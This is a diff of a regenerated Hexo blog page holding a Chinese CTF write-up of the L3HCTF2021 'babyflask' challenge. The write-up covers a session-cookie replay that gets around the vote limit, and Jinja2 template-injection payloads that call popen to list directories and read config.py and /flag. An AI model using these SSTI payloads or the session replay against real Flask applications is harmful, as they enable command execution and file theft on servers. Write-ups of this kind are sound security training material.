@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 3.9.0">
+<meta name="generator" content="Hexo 6.3.0">
 <script data-ad-client="ca-pub-6912066943609875" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
   <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.png">
   <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.png">
@@ -54,17 +54,26 @@
 </script>
 
   <meta name="description" content="L3HCTF2021-个人能力认证 Writeup">
-<meta name="keywords" content="CTF,L3HCTF,个人能力认证">
 <meta property="og:type" content="article">
 <meta property="og:title" content="L3HCTF2021-个人能力认证 Writeup">
 <meta property="og:url" content="https://zhaoqi.vip/posts/98571386/index.html">
 <meta property="og:site_name" content="温柔小猪">
 <meta property="og:description" content="L3HCTF2021-个人能力认证 Writeup">
-<meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2023-07-24T03:06:57.519Z">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://zhaoqi.vip/CTF/L3HCTF2021-%E4%B8%AA%E4%BA%BA%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81/Web/images/0.jpg">
+<meta property="og:image" content="https://zhaoqi.vip/CTF/L3HCTF2021-%E4%B8%AA%E4%BA%BA%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81/Web/images/1.jpg">
+<meta property="og:image" content="https://zhaoqi.vip/CTF/L3HCTF2021-%E4%B8%AA%E4%BA%BA%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81/Web/images/2.png">
+<meta property="og:image" content="https://zhaoqi.vip/CTF/L3HCTF2021-%E4%B8%AA%E4%BA%BA%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81/Web/images/3.png">
+<meta property="og:image" content="https://zhaoqi.vip/CTF/L3HCTF2021-%E4%B8%AA%E4%BA%BA%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81/Web/images/4.jpg">
+<meta property="og:image" content="https://zhaoqi.vip/CTF/L3HCTF2021-%E4%B8%AA%E4%BA%BA%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81/Web/images/5.png">
+<meta property="article:published_time" content="2021-11-14T11:05:32.000Z">
+<meta property="article:modified_time" content="2023-08-07T18:06:54.295Z">
+<meta property="article:author" content="Zhao Qi">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="L3HCTF">
+<meta property="article:tag" content="个人能力认证">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="L3HCTF2021-个人能力认证 Writeup">
-<meta name="twitter:description" content="L3HCTF2021-个人能力认证 Writeup">
+<meta name="twitter:image" content="https://zhaoqi.vip/CTF/L3HCTF2021-%E4%B8%AA%E4%BA%BA%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81/Web/images/0.jpg">
 
 <link rel="canonical" href="https://zhaoqi.vip/posts/98571386/">
 
@@ -128,6 +137,8 @@
 </noscript>
 
   
+<link rel="alternate" href="/atom.xml" title="温柔小猪" type="application/atom+xml">
+<link rel="alternate" href="/rss2.xml" title="温柔小猪" type="application/rss+xml">
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage">
@@ -307,7 +318,7 @@
                 <i class="fa fa-file-word-o"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>1.2k</span>
+              <span>1.4k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -327,47 +338,49 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="babyflask"><a href="#babyflask" class="headerlink" title="babyflask"></a>babyflask</h1><p><em><a href="http://123.60.19.253:10001" target="_blank" rel="noopener">http://123.60.19.253:10001</a></em></p>
+        <h1 id="babyflask"><a href="#babyflask" class="headerlink" title="babyflask"></a>babyflask</h1><p><em><a target="_blank" rel="noopener" href="http://123.60.19.253:10001/">http://123.60.19.253:10001</a></em></p>
 <hr>
 <p>分析给出的源文件,发现<code>/success</code>路由下的<code>name</code>存在SSTI漏洞.</p>
 <p>继续分析,<code>name</code>取自<code>session[&#39;name&#39;]</code>,用户登录时会自动创新用户和删除前一个同名用户的登录信息,那其实我们用注入的代码的作为用户名直接登录即可.</p>
-<pre><code class="python">template =  <span class="string">'''</span>
-<span class="string">Congratulations, %s. You can get flag now!</span>
-<span class="string">'''</span> % name
-<span class="keyword">return</span> render_template_string(template)
+<pre><code class="python">template =  &#39;&#39;&#39;
+Congratulations, %s. You can get flag now!
+&#39;&#39;&#39; % name
+return render_template_string(template)
 </code></pre>
 <p>要想执行到上述代码,需要给flag投满8票(我们手里只有5票),注意到vote是存储在session中,<code>/vote</code>接口会校验<code>session</code>中保存的vote数量并减一,猜测这里可能存在session会话劫持.</p>
 <p>我们第一次登录时复制一下当前的<code>session</code>,然后给flag投票,等手里的票用光之后,再把第一次登录时复制的<code>seesion</code>粘贴进浏览器保存的Cookie中,我们的票又回来了.</p>
 <blockquote>
 <p>🤠登录后疯狂点击“投票”,也能投满8票;可能因为Server响应太慢,浏览器中保存的session还没来得及被更新,导致多个请求发起时共用一个session(即vote数量相等),session中保存的vote最终只会减一.</p>
 </blockquote>
-<p><img data-src="../../CTF/L3HCTF2021-个人能力认证/Web/images/0.jpg" alt="image-20211114190032492" style="zoom:50%;"></p>
+<img data-src="../../CTF/L3HCTF2021-个人能力认证/Web/images/0.jpg" alt="image-20211114190032492" style="zoom:50%;" />
+
 <p>使用如下代码作为用户名登录,查看一下当前已加载模块</p>
-<pre><code class="python">{{''.__class__.__bases__[0].__subclasses__()}}
+<pre><code class="python">&#123;&#123;''.__class__.__bases__[0].__subclasses__()&#125;&#125;
 </code></pre>
-<p><img data-src="../../CTF/L3HCTF2021-个人能力认证/Web/images/1.jpg" alt="image-20211114182131940" style="zoom:50%;"></p>
-<p>人肉计数/写个脚本,找到<code>os._wrap_close</code>模块所在的索引,借助于<code>popen</code>函数可以直接执行系统命令</p>
-<pre><code class="python">num = <span class="number">0</span>
-<span class="keyword">for</span> i <span class="keyword">in</span> a.split(<span class="string">', '</span>):
-    <span class="keyword">if</span> <span class="string">'os._wrap_close'</span> <span class="keyword">in</span> i:
+<img data-src="../../CTF/L3HCTF2021-个人能力认证/Web/images/1.jpg" alt="image-20211114182131940" style="zoom:50%;" />
+
+<p>人肉计数&#x2F;写个脚本,找到<code>os._wrap_close</code>模块所在的索引,借助于<code>popen</code>函数可以直接执行系统命令</p>
+<pre><code class="python">num = 0
+for i in a.split(&#39;, &#39;):
+    if &#39;os._wrap_close&#39; in i:
         print(num)
-    num += <span class="number">1</span>
+    num += 1
 </code></pre>
 <p>先<code>ls -a</code>一下,发现<code>config.py</code></p>
-<pre><code class="python">{{''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('ls -a').read()}}
+<pre><code class="python">&#123;&#123;''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('ls -a').read()&#125;&#125;
 </code></pre>
-<p><img data-src="../../CTF/L3HCTF2021-个人能力认证/Web/images/2.png" alt="image-20211114183143814"><br>继续<code>cat</code>,没有在<code>config.py</code>中找到flag</p>
-<pre><code class="python">{{''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('cat config.py').read()}}
+<p><img data-src="/../../CTF/L3HCTF2021-%E4%B8%AA%E4%BA%BA%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81/Web/images/2.png" alt="image-20211114183143814"><br>继续<code>cat</code>,没有在<code>config.py</code>中找到flag</p>
+<pre><code class="python">&#123;&#123;''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('cat config.py').read()&#125;&#125;
 </code></pre>
-<p><img data-src="../../CTF/L3HCTF2021-个人能力认证/Web/images/3.png" alt="image-20211114183703433"></p>
+<p><img data-src="/../../CTF/L3HCTF2021-%E4%B8%AA%E4%BA%BA%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81/Web/images/3.png" alt="image-20211114183703433"></p>
 <p>用<code>ls -R /</code>找找,发现存在<code>/flag</code>文件</p>
-<pre><code class="python">{{''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('ls -R /').read()}}
+<pre><code class="python">&#123;&#123;''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('ls -R /').read()&#125;&#125;
 </code></pre>
-<p><img data-src="../../CTF/L3HCTF2021-个人能力认证/Web/images/4.jpg" alt="image-20211114183857713"><br>直接<code>cat /flag</code>即可</p>
-<pre><code class="python">{{''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()}}
+<p><img data-src="/../../CTF/L3HCTF2021-%E4%B8%AA%E4%BA%BA%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81/Web/images/4.jpg" alt="image-20211114183857713"><br>直接<code>cat /flag</code>即可</p>
+<pre><code class="python">&#123;&#123;''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()&#125;&#125;
 </code></pre>
-<p><img data-src="../../CTF/L3HCTF2021-个人能力认证/Web/images/5.png" alt="image-20211114184236370"></p>
-<p><strong>flag:</strong><code>l3hsec{emmMmMM_mm~mMMmm~~T}</code></p>
+<p><img data-src="/../../CTF/L3HCTF2021-%E4%B8%AA%E4%BA%BA%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81/Web/images/5.png" alt="image-20211114184236370"></p>
+<p><strong>flag:</strong><code>l3hsec&#123;emmMmMM_mm~mMMmm~~T&#125;</code></p>
 <link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>
     </div>
 
@@ -378,19 +391,19 @@
   <div class="popular-posts-header">相关文章</div>
   <ul class="popular-posts">
     <li class="popular-posts-item">
-      <div class="popular-posts-title"><a href="/posts/851556193/" rel="bookmark">GoogleCTF2023 Writeup</a></div>
+      <div class="popular-posts-title"><a href="/posts/4120451577/" rel="bookmark">BuckeyeCTF2021 Writeup</a></div>
+    </li>
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="/posts/2879210530/" rel="bookmark">DEADFACECTF Writeup</a></div>
+    </li>
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="/posts/2302350511/" rel="bookmark">DownUnderCTF2021 Writeup</a></div>
     </li>
     <li class="popular-posts-item">
       <div class="popular-posts-title"><a href="/posts/632988450/" rel="bookmark">GoogleCTF2022 Writeup</a></div>
     </li>
     <li class="popular-posts-item">
-      <div class="popular-posts-title"><a href="/posts/501486646/" rel="bookmark">TFCCTF2021 Writeup</a></div>
-    </li>
-    <li class="popular-posts-item">
-      <div class="popular-posts-title"><a href="/posts/3427623925/" rel="bookmark">K3RN3LCTF2021 Writeup</a></div>
-    </li>
-    <li class="popular-posts-item">
-      <div class="popular-posts-title"><a href="/posts/2621990551/" rel="bookmark">KillerQueenCTF2021 Writeup</a></div>
+      <div class="popular-posts-title"><a href="/posts/851556193/" rel="bookmark">GoogleCTF2023 Writeup</a></div>
     </li>
   </ul>
 
@@ -466,7 +479,7 @@
           <div class="post-tags">
               <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
               <a href="/tags/L3HCTF/" rel="tag"><i class="fa fa-tag"></i> L3HCTF</a>
-              <a href="/tags/个人能力认证/" rel="tag"><i class="fa fa-tag"></i> 个人能力认证</a>
+              <a href="/tags/%E4%B8%AA%E4%BA%BA%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81/" rel="tag"><i class="fa fa-tag"></i> 个人能力认证</a>
           </div>
 
         
@@ -578,16 +591,16 @@
 </div>
   <div class="links-of-author motion-element">
       <span class="links-of-author-item">
-        <a href="https://github.com/ZhaoQi99" title="GitHub → https://github.com/ZhaoQi99" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+        <a href="https://github.com/ZhaoQi99" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ZhaoQi99" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
       </span>
       <span class="links-of-author-item">
-        <a href="https://www.linkedin.com/in/zhaoqi99" title="Linkedin → https://www.linkedin.com/in/zhaoqi99" rel="noopener" target="_blank"><i class="fa fa-fw fa-linkedin"></i>Linkedin</a>
+        <a href="https://www.linkedin.com/in/zhaoqi99" title="Linkedin → https:&#x2F;&#x2F;www.linkedin.com&#x2F;in&#x2F;zhaoqi99" rel="noopener" target="_blank"><i class="fa fa-fw fa-linkedin"></i>Linkedin</a>
       </span>
       <span class="links-of-author-item">
         <a href="mailto:zhaoqi99@outlook.com" title="E-Mail → mailto:zhaoqi99@outlook.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
       </span>
       <span class="links-of-author-item">
-        <a href="tencent://AddContact/?fromId=45&fromSubId=1&subcmd=all&uin=956361916&website=www.oicqzone.com" title="QQ → tencent://AddContact/?fromId=45&fromSubId=1&subcmd=all&uin=956361916&website=www.oicqzone.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-qq"></i>QQ</a>
+        <a href="tencent://AddContact/?fromId=45&fromSubId=1&subcmd=all&uin=956361916&website=www.oicqzone.com" title="QQ → tencent:&#x2F;&#x2F;AddContact&#x2F;?fromId&#x3D;45&amp;fromSubId&#x3D;1&amp;subcmd&#x3D;all&amp;uin&#x3D;956361916&amp;website&#x3D;www.oicqzone.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-qq"></i>QQ</a>
       </span>
   </div>
 
@@ -624,13 +637,13 @@
       <i class="fa fa-area-chart"></i>
     </span>
       <span class="post-meta-item-text">站点总字数：</span>
-    <span title="站点总字数">203k</span>
+    <span title="站点总字数">214k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">5:38</span>
+    <span title="站点阅读时长">5:56</span>
 </div>
   <div class="addthis_inline_share_toolbox">
     <script src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5a73dc9a89a291e2" async="async"></script>
@@ -774,9 +787,19 @@
   <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
   <script src="//cdn.jsdelivr.net/npm/velocity-animate@1/velocity.min.js"></script>
   <script src="//cdn.jsdelivr.net/npm/velocity-animate@1/velocity.ui.min.js"></script>
-<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
 <script src="/js/schemes/pisces.js"></script>
-<script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
 
   <script defer src="//cdn.jsdelivr.net/gh/theme-next/theme-next-three@1/three.min.js"></script>
     <script defer src="//cdn.jsdelivr.net/gh/theme-next/theme-next-three@1/three-waves.min.js"></script>
@@ -798,7 +821,9 @@
 
 
 
-  <script src="/js/local-search.js"></script>
+  
+<script src="/js/local-search.js"></script>
+
 
 
 
